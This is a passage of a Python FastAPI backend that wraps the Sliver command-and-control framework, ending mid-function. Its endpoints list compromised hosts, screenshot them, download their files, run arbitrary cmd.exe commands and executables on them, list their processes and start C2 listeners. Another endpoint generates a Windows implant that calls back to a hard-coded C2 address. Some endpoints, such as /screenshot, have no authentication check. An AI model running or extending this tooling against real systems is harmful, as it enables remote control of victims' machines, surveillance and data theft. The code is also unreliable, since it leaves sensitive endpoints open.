import os
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Depends, status, Body, Request, Response, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel, ValidationError
from typing import Dict, Optional, List, Any, Set
from sliver import SliverClientConfig, SliverClient
from sliver import client_pb2
import asyncio
import time
from fastapi import Query
from fastapi.responses import JSONResponse
import base64
from fastapi.responses import Response
from datetime import datetime, timedelta, UTC
from jose import JWTError, jwt
import json
import geoip2.database
import geoip2.errors
from pathlib import Path
from collections import defaultdict

# Import local modules using direct imports since we're running from v1 directory
from utils.geoip import GeoIPManager
from middleware.tracking import TrackingMiddleware
from models import (
    User,
    UserCreate,
    UserInDB,
    UserUpdate,
    UserResponse,
    Token,
    TokenData,
    LoginRequest,
    ErrorResponse,
    ConnectionCreate,
    ConnectionUpdate,
    Connection,
    ConnectionResponse,
    ConnectionStatus,
    SliverSession,
    CommandItem,
    ListenerCommandItem,
    GenerateCommandItem,
    UserMetadata,
    GeoLocation,
    ActionLog,
    PageVisit,
    ApiCall,
    FailedLoginAttempt,
    SessionToken,
    PasswordChange,
    PyObjectId
)
from database import (
    # User operations
    get_user,
    get_all_users,
    get_user_by_id,
    get_user_by_email,
    create_user,
    delete_user,
    authenticate_user,
    create_access_token,
    get_password_hash,
    verify_password,
    
    # Database initialization
    init_db,
    
    # Connection operations
    get_connection,
    get_connections,
    create_connection,
    update_connection_status,
    delete_connection,
    
    # User activity and tracking
    update_user_location,
    update_user_activity,
    update_user_last_login,
    log_user_action,
    log_page_visit,
    log_api_call,
    log_failed_login,
    log_session_token,
    log_password_change,
    get_location_from_ip,
    
    # Sliver C2 Session operations
    update_sliver_session,
    get_sliver_session,
    get_all_sliver_sessions,
    delete_sliver_session,
    
    # Constants
    SECRET_KEY,
    ALGORITHM
)

class ErrorResponse(BaseModel):
    detail: str

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

# Move authentication functions here, before any routes
async def get_current_user(token: str = Depends(oauth2_scheme)) -> UserInDB:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        token_data = TokenData(username=username)
    except JWTError:
        raise credentials_exception
    
    user = await get_user(username=token_data.username)
    if user is None:
        raise credentials_exception
    return user

async def get_current_active_user(current_user: UserInDB = Depends(get_current_user)) -> UserInDB:
    if not current_user.is_active:
        raise HTTPException(status_code=400, detail="Inactive user")
    return current_user

# Global client instance
_client = None
_current_interactive_session = None

# Add these constants at the top with other constants
IGNORED_ENDPOINTS = {
    "/api/user/activity",  # Ignore frequent activity updates
    "/api/user/page-visit",  # Ignore page visits for now
    "/auth/verify",  # Ignore token verification
    "/health",  # Ignore health checks
    "/sessions",
    "/jobs",
    "/connected",
    "/operators",
    "/jobs",
    "/users",
}

# Move FastAPI app initialization to the top, before any middleware
app = FastAPI(
    title="Sliver API",
    description="REST API for interacting with Sliver C2",
    version="1.0.0",
    # lifespan=lifespan
)

# Add CORS middleware with proper configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173", "http://127.0.0.1:5173", "http://localhost:3000", "http://127.0.0.1:3000"],  # Add all possible frontend origins
    allow_origin_regex=r"http://localhost:\d+",  # Allow any localhost port
    allow_credentials=True,
    allow_methods=["*"],  # Allow all methods
    allow_headers=["*"],  # Allow all headers
    expose_headers=["*"],
    max_age=3600,
)

# Add request logging middleware
# @app.middleware("http")
# async def log_requests(request: Request, call_next):
#     """Log all incoming requests"""
#     # print(f"Incoming request: {request.method} {request.url}")
#     # print(f"Headers: {request.headers}")
#     if request.method in ["POST", "PUT", "PATCH"]:
#         try:
#             body = await request.json()
#             print(f"Request body: {body}")
#         except:
#             print("Could not parse request body")
    
#     response = await call_next(request)
#     return response

# Get the absolute path to the GeoLite2 database
BASE_DIR = Path(__file__).resolve().parent
GEOIP_DB_PATH = os.path.join(BASE_DIR, "GeoLite2-City.mmdb")

# Initialize GeoIP manager
geoip_manager = GeoIPManager(GEOIP_DB_PATH)
tracking_middleware = TrackingMiddleware(geoip_manager)

# Update lifespan to include app
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage the Sliver client lifecycle"""
    global _client
    # Startup code — no connection now
    await init_db()
    yield
    # Shutdown code
    if _client is not None:
        await _client.close()
        _client = None
    if geoip_manager:
        geoip_manager.close()

@app.middleware("http")
async def track_requests(request: Request, call_next):
    """Basic request logging middleware"""
    start_time = datetime.now(UTC)
    
    # Get the response
    response = await call_next(request)
    
    # Only log non-heartbeat requests
    if request.url.path != "/api/user/heartbeat":
        print(f"Request: {request.method} {request.url.path}")
    
    return response

async def get_client() -> SliverClient:
    """Get the Sliver client instance"""
    global _client
    if _client is None:
        raise HTTPException(status_code=500, detail="Sliver client not initialized")
    return _client

@app.get("/sessions")
async def list_sliver_sessions(current_user: User = Depends(get_current_active_user)):
    """List all active Sliver C2 sessions from both server and database"""
    try:
        # Get sessions from Sliver server
        client = await get_client()
        sliver_sessions = await client.sessions()
        
        # Get all sessions from database first
        db_sessions = await get_all_sliver_sessions()
        
        # Create a set of active session IDs from Sliver server
        active_session_ids = {str(session.ID) for session in sliver_sessions}
        
        # Mark all database sessions as dead if they're not in active sessions
        for db_session in db_sessions:
            if db_session.session_id not in active_session_ids:
                try:
                    # Update session status in database
                    session_data = {
                        "session_id": db_session.session_id,
                        "name": db_session.name,
                        "hostname": db_session.hostname,
                        "username": db_session.username,
                        "uid": db_session.uid,
                        "gid": db_session.gid,
                        "os": db_session.os,
                        "arch": db_session.arch,
                        "transport": db_session.transport,
                        "remote_address": db_session.remote_address,
                        "pid": db_session.pid,
                        "filename": db_session.filename,
                        "active_c2": db_session.active_c2,
                        "version": db_session.version,
                        "reconnect_interval": db_session.reconnect_interval,
                        "proxy_url": db_session.proxy_url,
                        "burned": db_session.burned,
                        "extensions": db_session.extensions,
                        "is_dead": True,  # Mark as dead
                        "first_seen": int(db_session.first_seen.timestamp()),
                        "last_seen": int(db_session.last_seen.timestamp())
                    }
                    await update_sliver_session(session_data)
                except Exception as e:
                    print(f"Error updating dead status for session {db_session.session_id}: {e}")
        
        # Convert Sliver sessions to our session model format and update database
        active_sessions = {}  # Use dict to track unique sessions by ID
        for session in sliver_sessions:
            try:
                # Keep timestamps as integers
                first_contact = int(session.FirstContact)
                last_checkin = int(session.LastCheckin)
                
                # Normalize transport value
                transport = str(session.Transport).lower()
                if transport == "http(s)":
                    transport = "https"  # Default to https for http(s)
                
                # Ensure proper type conversion
                session_data = {
                    "session_id": str(session.ID),
                    "name": str(session.Name),
                    "hostname": str(session.Hostname),
                    "username": str(session.Username),
                    "uid": str(session.UID),
                    "gid": str(session.GID),
                    "os": str(session.OS).lower(),
                    "arch": str(session.Arch).lower(),
                    "transport": transport,
                    "remote_address": str(session.RemoteAddress),
                    "pid": int(session.PID),
                    "filename": str(session.Filename),
                    "active_c2": str(session.ActiveC2),
                    "version": str(session.Version),
                    "reconnect_interval": int(session.ReconnectInterval),
                    "proxy_url": str(session.ProxyURL) if session.ProxyURL else "",
                    "burned": bool(session.Burned),
                    "extensions": dict(session.Extensions) if session.Extensions else {},
                    "is_dead": bool(session.IsDead),
                    "first_seen": first_contact,  # Keep as integer
                    "last_seen": last_checkin     # Keep as integer
                }
                
                # Update session in database
                try:
                    await update_sliver_session(session_data)
                except Exception as e:
                    print(f"Error updating session in database: {e}")
                
                # Add to active sessions with camelCase for frontend
                active_sessions[session_data["session_id"]] = {
                    "id": session_data["session_id"],
                    "hostname": session_data["hostname"],
                    "username": session_data["username"],
                    "transport": session_data["transport"],
                    "remote_address": session_data["remote_address"],
                    "os": session_data["os"],
                    "firstContact": first_contact,  # Send as integer
                    "lastCheckIn": last_checkin,    # Send as integer
                    "isDead": session_data["is_dead"],
                    "_last_seen_timestamp": last_checkin  # Already an integer
                }
                
            except Exception as e:
                print(f"Error processing session {session.ID}: {e}")
                continue
        
        # Add database sessions that aren't in active sessions (they will be marked as dead)
        for db_session in db_sessions:
            try:
                if db_session.session_id not in active_sessions:
                    active_sessions[db_session.session_id] = {
                        "id": db_session.session_id,
                        "hostname": db_session.hostname,
                        "username": db_session.username,
                        "transport": db_session.transport,
                        "remote_address": db_session.remote_address,
                        "os": db_session.os,
                        "firstContact": int(db_session.first_seen.timestamp()),  # Convert to integer
                        "lastCheckIn": int(db_session.last_seen.timestamp()),    # Convert to integer
                        "isDead": True,  # Mark as dead since not in active sessions
                        "_last_seen_timestamp": int(db_session.last_seen.timestamp())  # Convert to integer
                    }
            except Exception as e:
                print(f"Error processing database session {db_session.session_id}: {e}")
                continue
        
        # Convert to list and sort by last_seen
        sessions_list = list(active_sessions.values())
        sessions_list.sort(key=lambda x: x["_last_seen_timestamp"], reverse=True)
        
        return sessions_list
        
    except Exception as e:
        print(f"Error listing Sliver sessions: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=str(e)
        )

@app.get("/sessions/{session_id}")
async def get_sliver_session_details(
    session_id: str,
    current_user: User = Depends(get_current_active_user)
):
    """Get details for a specific Sliver C2 session"""
    try:
        # First check if we have the session in our database
        db_session = await get_sliver_session(session_id)
        if db_session:
            return db_session.model_dump()
            
        # If not in database, try to get from Sliver client
        client = await get_client()
        sliver_sessions = await client.sessions()
        session = next((s for s in sliver_sessions if s.ID == session_id), None)
        
        if not session:
            raise HTTPException(status_code=404, detail="Sliver session not found")
            
        # Convert to our session model format and store in database
        session_data = {
            "session_id": session.ID,
            "name": session.Name,
            "hostname": session.Hostname,
            "username": session.Username,
            "uid": session.UID,
            "gid": session.GID,
            "os": session.OS,
            "arch": session.Arch,
            "transport": session.Transport,
            "remote_address": session.RemoteAddress,
            "pid": session.PID,
            "filename": session.Filename,
            "active_c2": session.ActiveC2,
            "version": session.Version,
            "reconnect_interval": session.ReconnectInterval,
            "proxy_url": session.ProxyURL or "",
            "burned": session.Burned,
            "extensions": session.Extensions or {},
            "is_dead": session.IsDead
        }
        
        # Update session in database
        await update_sliver_session(session_data)
        
        # Get the updated session from database (includes first_seen and last_seen)
        updated_session = await get_sliver_session(session_id)
        return updated_session.model_dump()
        
    except Exception as e:
        print(f"Error getting Sliver session details: {e}")
        raise HTTPException(status_code=500, detail=str(e))

def unix_timestamp_to_time(timestamp):
    """Convert a Unix timestamp to a human-readable datetime string."""
    return datetime.fromtimestamp(timestamp, UTC).strftime('%d/%m/%y %H:%M %Z')

@app.get("/sessions/{session_id}/files")
async def list_files(
    session_id: str,
    path: Optional[str] = Query("/"),
    current_user: User = Depends(get_current_active_user)
):
    try:
        client = await get_client()
        sessions = await client.sessions()
        session_obj = next((s for s in sessions if s.ID == session_id), None)

        if not session_obj:
            raise HTTPException(status_code=404, detail="Session not found")

        global _current_interactive_session
        _current_interactive_session = await client.interact_session(session_id)
        return {
            "status": session_obj.IsDead, 
            "session_id": session_obj.ID, 
            "Name": session_obj.Name,
            "Hostname" : session_obj.Hostname,
            "Username" : session_obj.Username,
            "UID" : session_obj.UID,
            "GID" : session_obj.GID,
            "OS" : session_obj.OS,
            "Arch" : session_obj.Arch,
            "Remote Address" : session_obj.RemoteAddress,
            "PID" : session_obj.PID,
            "Filename" : session_obj.Filename,
            "Active C2": session_obj.ActiveC2,
            "Version" : session_obj.Version,               
            "Reconnect Interval": session_obj.ReconnectInterval,
            "Proxy URL": session_obj.ProxyURL,
            "Burned" : session_obj.Burned,
            "Extensions" :session_obj.Extensions,
            "isDead" : session_obj.IsDead,
            "ip" : _current_interactive_session.ifconfig,
            }

    except Exception as e:
        print(f"Error connecting to session: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/screenshot")
async def get_screenshot():
    global _current_interactive_session
    try:
        # Get screenshot from sliver session
        screenshot_pb = await _current_interactive_session.screenshot()

        # Extract PNG data from protobuf
        png_data = screenshot_pb.Data  # or screenshot_pb.image_data
        # Return as image response
        return Response(
            content=png_data,
            media_type="image/png",
            headers={"Cache-Control": "no-cache"}
        )
        
    except Exception as e:
        print("error: ", e)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/connected")
async def connected_or_not():
    global _client
    return _client is not None and _client.is_connected()

@app.get("/operators")
async def list_operators():
    """List all operators"""
    print("request to operators came")
    try:
        client = await get_client()
        operators = await client.operators()
        obj_to_be_returned = []
        id = 1
        for op in operators:
            obj_to_be_returned.append({"id": id, "name": op.Name, "isOnline":op.Online})
            id += 1
        return obj_to_be_returned
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/connect")
async def connect_sliver(
    config: Dict[str, Any] = Body(...),
    current_user: User = Depends(get_current_active_user)
):
    """Connect to Sliver server using provided configuration"""
    try:
        global _client

        # Validate required fields
        required_fields = ["operator", "token", "lhost", "lport", "ca_certificate", "private_key", "certificate"]
        missing_fields = [field for field in required_fields if field not in config]
        if missing_fields:
            raise HTTPException(
                status_code=400,
                detail=f"Missing required configuration fields: {', '.join(missing_fields)}"
            )

        # print(config)
        # Create SliverClientConfig from provided config
        try:
            sliver_config = SliverClientConfig(
                operator=config["operator"],
                token=config["token"],
                lhost=config["lhost"],
                lport=config["lport"],
                ca_certificate=config["ca_certificate"],
                private_key=config["private_key"],
                certificate=config["certificate"]
            )
        except Exception as e:
            raise HTTPException(
                status_code=400,
                detail=f"Invalid configuration format: {str(e)}"
            )

        # Initialize or update client
        if _client is not None:
            await _client.close()
        _client = SliverClient(sliver_config)

        # Attempt connection
        try:
            await _client.connect()
            return {"status": "connected", "message": "Successfully connected to Sliver server"}
        except Exception as e:
            _client = None
            raise HTTPException(
                status_code=500,
                detail=f"Failed to connect to Sliver server: {str(e)}"
            )

    except HTTPException as he:
        raise he
    except Exception as e:
        _client = None
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/disconnect")
async def disconnect_sliver(current_user: User = Depends(get_current_active_user)):
    """Disconnect from Sliver server"""
    try:
        global _client
        if _client is not None:
            _client = None
        return {"status": "disconnected", "message": "Successfully disconnected from Sliver server"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/jobs")
async def list_jobs(current_user: User = Depends(get_current_active_user)):
    # print("request to jobs came")
    """List all active jobs"""
    try:
        client = await get_client()
        jobs = await client.jobs()
        jobs_to_be_returned = []
        for job in jobs:
            jobs_to_be_returned.append({"id":job.ID, "name":job.Name, "port":job.Port, "protocol":job.Protocol})
        jobs_to_be_returned.sort(key=lambda x: x["id"], reverse=False)
        return jobs_to_be_returned
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/interactwithsession")
async def interact_with_session(
    item: CommandItem,
    current_user: User = Depends(get_current_active_user)
):
    print("Interact with session request came: ")
    global _current_interactive_session
    if _current_interactive_session is None:
        raise HTTPException(status_code=400, detail="Session not initialized")
    
    commands = [item.strip() for item in item.command.split(',')]
    print(commands)
    
    try:
        if (commands[0] == 'ls'):
            result = await _current_interactive_session.ls()
            return {
                "status": "success",
                "result": str(result)
            }
        elif (commands[0] == 'cd'):
            result = await _current_interactive_session.cd(commands[1])
            return {
                "status": "success",
                "result": str(result)
            }
        elif (commands[0] == 'download'):
            # Get the file path from commands[1]
            result = await _current_interactive_session.download(commands[1])
            # Return as binary data with proper filename
            filename = commands[1].split('/')[-1]  # Get just the filename
            return Response(
                content=result.Data,
                media_type="application/octet-stream",
                headers={
                    "Content-Disposition": f'attachment; filename="{filename}"',
                    "Cache-Control": "no-cache"
                }
            )
        elif (commands[0] == 'execute'):
            # Handle both command execution and file execution
            mode = commands[1]  # 'command' or 'exe'
            
            if mode == 'command':
                # Execute command using cmd.exe
                result = await _current_interactive_session.execute(
                    exe="C:\\Windows\\System32\\cmd.exe",
                    args=["/c", commands[2]],  # The actual command
                    output=True
                )
                return {
                    "status": "success",
                    "stdout": result.Stdout.decode() if hasattr(result, 'Stdout') else "",
                    "stderr": result.Stderr.decode() if hasattr(result, 'Stderr') else "",
                    "exitCode": result.ExitCode if hasattr(result, 'ExitCode') else None
                }
            elif mode == 'exe':
                # Execute file directly
                result = await _current_interactive_session.execute(
                    exe=commands[2],  # The executable path
                    args=commands[3:] if len(commands) > 3 else None,  # Optional arguments
                    output=True
                )
                return {
                    "status": "success",
                    "stdout": result.Stdout.decode() if hasattr(result, 'Stdout') else "",
                    "stderr": result.Stderr.decode() if hasattr(result, 'Stderr') else "",
                    "exitCode": result.ExitCode if hasattr(result, 'ExitCode') else None
                }
            else:
                raise HTTPException(status_code=400, detail="Invalid execution mode")

    except Exception as e:
        print("error: ", e)
        return {
            "status": "error",
            "detail": str(e)
        }

@app.post("/interactwithlisteners")
async def interact_with_listeners(
    item: ListenerCommandItem,
    current_user: User = Depends(get_current_active_user)
):
    print("Interact with listeners request came: ")
    global _client
    if _client is None:
        raise HTTPException(status_code=400, detail="Session not initialized")
    command = item.command.lower()
    config = item.config or {}
    print(command, config)
    
    try:
        result = ""
        if command == 'http':
            result = await _client.start_http_listener(
                host=config.get("host", "0.0.0.0"),
                port=config.get("port", 80),
                persistent=config.get("persistent", False),
                timeout=config.get("timeout", 60)
            )
        elif command == 'https':
            result = await _client.start_https_listener()
        elif command == 'dns':
            result = await _client.start_dns_listener(domains="")
        elif command == 'mtls':
            result = await _client.start_mtls_listener()
        elif command == 'wg':
            result = await _client.start_wg_listener(tun_ip="")
        else:
            raise HTTPException(status_code=400, detail=f"Unknown command: {command}")

        return {
            "status": "success",
            "result": str(result),
        }

    except Exception as e:
        print("error: ", e)
        return {
            "status": "error",
            "detail": str(e)
        }
    
@app.post("/interactwithGenerate")
async def interact_with_generate(
    item: GenerateCommandItem,
    current_user: User = Depends(get_current_active_user)
):
    print("Generate request came: ")
    global _client
    if _client is None:
        raise HTTPException(status_code=400, detail="Session not initialized")
    command = item.command.lower()
    config = item.config or {}
    print(command, config)
    # print(list(client_pb2.OutputFormat.keys()))
    try:
        result = ""
        if command == "implant":
            implant_config = client_pb2.ImplantConfig(
                ID="test-implant",
                IsBeacon=False,
                # BeaconInterval=30,
                # BeaconJitter=20,
                GOOS="windows",
                GOARCH="amd64",
                Name="TestImplant1113",
                Debug=False,
                Evasion=False,
                ObfuscateSymbols=False,
                Format=client_pb2.OutputFormat.Value("EXECUTABLE"),
                # IsSharedLib=False,
                # IsService=False,
                # IsShellcode=False,
                # RunAtLoad=False,
                FileName="implant2.exe",
                C2=[
                    client_pb2.ImplantC2(
                        Priority=0,
                        URL="http://192.168.104.137",
                        Options=""
                    )
                ],
            )
            response = await _client.generate_implant(implant_config)
            print(dir(response))
            print(dir(response.File))
            print(response.ListFields())
            print(response.ByteSize())
            # response_bytes = response.Data
            # Save it as a file on disk
            file_path = "implant_output/implant.exe"
            with open(file_path, "wb") as f:
                f.write(response.File.Data)

            print(f"File saved at: {file_path}")
            return {"status": "success", "detail": f"File saved at {file_path}"}
            return Response(
                content=response,
                media_type="application/octet-stream",
                headers={"Content-Disposition": "attachment; filename=implant.exe"},
                status_code=status.HTTP_200_OK
            )
        else:
            raise HTTPException(status_code=400, detail=f"Unknown command: {command}")

        return {
            "status": "success",
            "result": str(result),
        }

    except Exception as e:
        print("error: ", e)
        return {
            "status": "error",
            "detail": str(e)
        }

@app.get("/health")
async def health_check():
    """Service health check"""
    return {"status": "healthy"}

@app.post("/auth/login", response_model=Token)
async def login_for_access_token(
    login_data: LoginRequest = Body(...),
    request: Request = None
):
    print("Login request came: ", login_data)
    """Login endpoint that matches frontend expectation"""
    try:
        user = await authenticate_user(
            login_data.username,
            login_data.password,
            request.client.host if request else "unknown"
        )
        if not user:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect username or password",
                headers={"WWW-Authenticate": "Bearer"},
            )
        
        # Update last login
        await update_user_last_login(user.username)
        
        # Create access token
        access_token = create_access_token(
            data={"sub": user.username},
            ip=request.client.host if request else "unknown"
        )
        
        # Return token in the format expected by frontend
        return {
            "token": access_token,
            "token_type": "bearer",
            "user": {
                "username": user.username,
                "email": user.email,
                "is_admin": user.is_admin
            }
        }
    except ValidationError as e:
        print("Login validation error:", str(e))
        error_messages = []
        for error in e.errors():
            field = error["loc"][-1]
            msg = error["msg"]
            error_messages.append(f"{field}: {msg}")
        raise HTTPException(
            status_code=422,
            detail={"validation_errors": error_messages}
        )
    except Exception as e:
        print("Unexpected login error:", str(e))
        raise HTTPException(
            status_code=500,
            detail=f"An unexpected error occurred: {str(e)}"
        )

@app.post("/auth/signup", response_model=Token)
async def signup(user_data: UserCreate, request: Request):
    """Signup endpoint that matches frontend expectation"""
    try:
        print("Signup request received:", user_data.model_dump(exclude={'password'}))
        
        # Create user
        user = await create_user(user_data)
        
        # Create access token
        access_token = create_access_token(
            data={"sub": user.username},
            ip=request.client.host
        )
        
        # Return in format expected by frontend
        return {
            "token": access_token,
            "token_type": "bearer",
            "user": {
                "username": user.username,
                "email": user.email,
                "is_admin": user.is_admin
            }
        }
    except ValueError as e:
        print("Signup validation error (ValueError):", str(e))
        raise HTTPException(
            status_code=400,
            detail=str(e)
        )
    except ValidationError as e:
        print("Signup validation error (ValidationError):", e.errors())
        error_messages = []
        for error in e.errors():
            field = error["loc"][-1]
            msg = error.get("msg", "")
            error_type = error.get("type", "")
            
            # Custom error messages based on field and error type
            if field == "password":
                if "min_length" in error_type:
                    error_messages.append("Password must be at least 8 characters long")
                elif "pattern" in error_type:
                    error_messages.append("Password must contain both letters and numbers")
                else:
                    error_messages.append(f"Password error: {msg}")
            elif field == "username":
                if "min_length" in error_type:
                    error_messages.append("Username must be at least 3 characters long")
                elif "max_length" in error_type:
                    error_messages.append("Username cannot be longer than 50 characters")
                elif "pattern" in error_type:
                    error_messages.append("Username can only contain letters, numbers, underscores, and hyphens")
                else:
                    error_messages.append(f"Username error: {msg}")
            elif field == "email":
                error_messages.append("Please enter a valid email address")
            else:
                error_messages.append(f"{field}: {msg}")
        
        raise HTTPException(
            status_code=422,
            detail={"validation_errors": error_messages}
        )
    except Exception as e:
        print("Unexpected signup error:", str(e))
        raise HTTPException(
            status_code=500,
            detail=f"An unexpected error occurred: {str(e)}"
        )

@app.get("/auth/verify")
async def verify_token(current_user: User = Depends(get_current_active_user)):
    """Verify if the current token is valid and return user info"""
    try:
        return {
            "isAuthenticated": True,
            "user": {
                "username": current_user.username,
                "email": current_user.email,
                "is_admin": current_user.is_admin
            }
        }
    except Exception as e:
        print("Token verification error:", str(e))
        raise HTTPException(
            status_code=401,
            detail="Invalid or expired token"
        )

# Add rate limiting
class RateLimiter:
    def __init__(self, requests_per_minute: int = 60):
        self.requests_per_minute = requests_per_minute
        self.requests = defaultdict(list)
    
    def is_rate_limited(self, client_id: str) -> bool:
        now = time.time()
        # Remove old requests
        self.requests[client_id] = [req_time for req_time in self.requests[client_id] 
                                  if now - req_time < 60]
        # Check if too many requests
        if len(self.requests[client_id]) >= self.requests_per_minute:
            return True
        # Add new request
        self.requests[client_id].append(now)
        return False

# Initialize rate limiter
rate_limiter = RateLimiter(requests_per_minute=60)

@app.post("/api/user/heartbeat")
async def update_heartbeat(request: Request):
    """Update user's activity heartbeat with rate limiting and graceful auth handling"""
    try:
        # Get client identifier for rate limiting
        client_id = f"{request.client.host}:{request.headers.get('x-device-fingerprint', 'unknown')}"
        
        # Check rate limit
        if rate_limiter.is_rate_limited(client_id):
            return JSONResponse(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                content={"detail": "Too many requests"}
            )
        
        # Get client info
        client_ip = request.client.host
        user_agent = request.headers.get("user-agent", "Unknown")
        device_fingerprint = request.headers.get("x-device-fingerprint")
        
        # Try to get current user, but don't require it
        try:
            token = request.headers.get("authorization", "").replace("Bearer ", "")
            if token:
                try:
                    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
                    username = payload.get("sub")
                    if username:
                        user = await get_user(username)
                        if user and user.is_active:
                            # Update user activity if authenticated
                            await update_user_activity(
                                username=user.username,
                                ip=client_ip,
                                user_agent=user_agent,
                                device_fingerprint=device_fingerprint
                            )
                            return {
                                "status": "success",
                                "message": "Activity updated",
                                "authenticated": True
                            }
                except JWTError:
                    pass  # Invalid token, continue as unauthenticated
        
        except Exception as e:
            print(f"Error in heartbeat authentication: {e}")
            # Continue as unauthenticated
        
        # Return success even if not authenticated
        return {
            "status": "success",
            "message": "Heartbeat received",
            "authenticated": False
        }
        
    except Exception as e:
        print(f"Error updating heartbeat: {e}")
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={"detail": "Internal server error"}
        )

@app.get("/users/me", response_model=UserInDB)
async def read_users_me(current_user: UserInDB = Depends(get_current_active_user)):
    return current_user

@app.get("/users", response_model=List[UserInDB])
async def list_users(current_user: UserInDB = Depends(get_current_active_user)):
    """List all users in the system. Only accessible by admin users."""
    if not current_user.is_admin:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Only admin users can access this endpoint"
        )
    try:
        users = await get_all_users()
        return users
    except Exception as e:
        print(f"Error listing users: {e}")  # Add logging
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/users/{user_id}", response_model=UserInDB)
async def get_user_by_id_endpoint(
    user_id: str,
    current_user: UserInDB = Depends(get_current_active_user)
):
    """Get a specific user by ID. Only accessible by admin users."""
    if not current_user.is_admin:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Only admin users can access this endpoint"
        )
    try:
        user = await get_user_by_id(user_id)
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        return user
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Connection management endpoints
@app.get("/connections", response_model=List[ConnectionResponse])
async def list_connections(current_user: User = Depends(get_current_active_user)):
    """Get all connections for the current user"""
    try:
        connections = await get_connections(current_user.id)
        return connections
    except Exception as e:
        print(f"Error getting connections: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=str(e)
        )

@app.get("/connections/{connection_id}", response_model=Connection)
async def get_connection_by_id(
    connection_id: str,
    current_user: User = Depends(get_current_active_user)
):
    """Get a specific connection by ID"""
    try:
        connection = await get_connection(connection_id, current_user.id)
        if not connection:
            raise HTTPException(status_code=404, detail="Connection not found")
        return connection
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/connections", response_model=ConnectionResponse)
async def create_connection_endpoint(
    connection: ConnectionCreate,
    current_user: User = Depends(get_current_active_user)
):
    """Create a new connection configuration"""
    # print("connection request came to /connection endpoint")
    try:
        # Validate the config JSON
        try:
            config_dict = json.loads(connection.config)
            required_fields = ["operator", "token", "lhost", "lport", "ca_certificate", "private_key", "certificate"]
            missing_fields = [field for field in required_fields if field not in config_dict]
            if missing_fields:
                raise HTTPException(
                    status_code=400,
                    detail=f"Missing required fields in config: {', '.join(missing_fields)}"
                )
        except json.JSONDecodeError:
            raise HTTPException(
                status_code=400,
                detail="Invalid JSON configuration"
            )

        # Prepare connection data
        connection_data = {
            "name": connection.name,
            "config": connection.config,  # Keep as string since it's already validated
            "created_by": current_user.id
        }
        # Create the connection
        try:
            created_connection = await create_connection(connection_data)
            return ConnectionResponse(
                id=created_connection.id,
                name=created_connection.name,
                created_at=created_connection.created_at,
                last_used=created_connection.last_used,
                is_active=created_connection.is_active,
                created_by=created_connection.created_by
            )
        except Exception as e:
            print(f"Error creating connection in database: {str(e)}")
            raise HTTPException(
                status_code=500,
                detail="Failed to create connection in database"
            )

    except HTTPException as he:
        raise he
    except Exception as e:
        print(f"Error in create_connection_endpoint: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Failed to create connection: {str(e)}"
        )

@app.delete("/connections/{connection_id}")
async def delete_connection_by_id(
    connection_id: str,
    current_user: User = Depends(get_current_active_user)
):
    """Delete a connection configuration"""
    try:
        success = await delete_connection(connection_id, current_user.id)
        if not success:
            raise HTTPException(status_code=404, detail="Connection not found")
        return {"status": "success"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/processes")
async def list_processes(
    session_id: str = Query(..., description="Session ID to get processes from"),
    current_user: User = Depends(get_current_active_user)
):
    """Get list of running processes from the session"""
    try:
        # Get client instance
        client = await get_client()
        
        # Get the session
        session = await client.interact_session(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
        
        # Get process list from sliver session
        processes = await session.ps()
        
        # Convert process list to a more frontend-friendly format
        process_list = []
        for proc in processes:
            try:
                # Extract only the fields we need and ensure they're JSON serializable
                process_info = {
                    "pid": int(proc.Pid) if hasattr(proc, 'Pid') else None,
                    "ppid": int(proc.Ppid) if hasattr(proc, 'Ppid') else None,
                    "executable": str(proc.Executable) if hasattr(proc, 'Executable') else None,
                    "owner": str(proc.Owner) if hasattr(proc, 'Owner') else None,
                    "session_id": str(proc.SessionID) if hasattr(proc, 'SessionID') else None,
                    "architecture": str(proc.Architecture) if hasattr(proc, 'Architecture') else None,
                    "cmd_line": [str(cmd) for cmd in proc.CmdLine] if hasattr(proc, 'CmdLine') and proc.CmdLine else []
                }
                # Only add if we have at least a PID
                if process_info["pid"] is not None:
                    process_list.append(process_info)
            except Exception as proc_err:
                print(f"Error processing process entry: {proc_err}")
                continue
            
        return JSONResponse(
            content={
                "status": "success",
                "processes": process_list
            }
        )
        
    except Exception as e:
        print(f"Error getting process list: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Failed to get process list: {str(e)}"
        )

@app.post("/processes/{pid}/terminate")
async def terminate_process(
    pid: int,
    session_id: str = Query(..., description="Session ID to terminate process in"),
